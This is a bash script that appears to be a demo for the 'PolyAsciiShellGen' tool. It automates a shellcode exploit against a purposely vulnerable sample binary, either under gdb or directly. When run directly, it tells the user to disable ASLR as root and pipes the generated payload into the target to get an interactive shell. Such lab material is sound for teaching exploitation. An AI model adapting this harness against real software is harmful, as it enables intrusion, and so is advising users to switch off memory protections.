#!/bin/bash

set -e

SCRIPT=$(realpath $0)
SCRIPTPATH=$(dirname $SCRIPT)

cd  "$SCRIPTPATH"


in_gdb()
{
    payload=$(./exploit_ascii_filter_sample.sh)

    echo -e "\n\n[Payload Generation] "
    echo -e "\n"
    echo "$payload" | hexdump -C
    echo -e "\n\n"

    echo "$payload" > /tmp/exploit_ascii_filter_stdin_gdb

    gdb -q ./vuln_ascii_filter_sample  \
        --command=exploit_ascii_filter_sample.gdb
}

out_gdb()
{
    if [ "$(cat /proc/sys/kernel/randomize_va_space)" != "0" ]
    then
        echo -e "\n\n This demo need to run in non randomized address space.\n"
        echo -e " Please run as root:\n"
        echo -e " echo 0 > /proc/sys/kernel/randomize_va_space\n\n"
        exit 1
    fi

    payload=$(./exploit_ascii_filter_sample.sh)

    echo -e "\n\n[Payload Generation] "
    echo -e "\n"
    echo "$payload" | hexdump -C

    ( echo "$payload" ; cat ) | ./exec_wrapper
}

cmd_line_arguments_ttmt()
{
    if [ "$1" == "in-gdb" ]
    then
        in_gdb
    elif [ "$1" == "out-gdb" ]
    then
        out_gdb
    else
      echo -e "
  Demo PolyAsciiShellGen

  This demo automates the exploitation of 'vuln_ascii_filter_sample' with
  PolyAsciiShellGen. It provides two contexts of execution, in or out of
  the debugger.

  Usage:
    demo_PolyAsciiShellGen.sh [options]

  Options:
    in-gdb      Run the demo in gdb.
    out-gdb     Run the demo out of gdb.
      "
    fi
}


cmd_line_arguments_ttmt "$@"
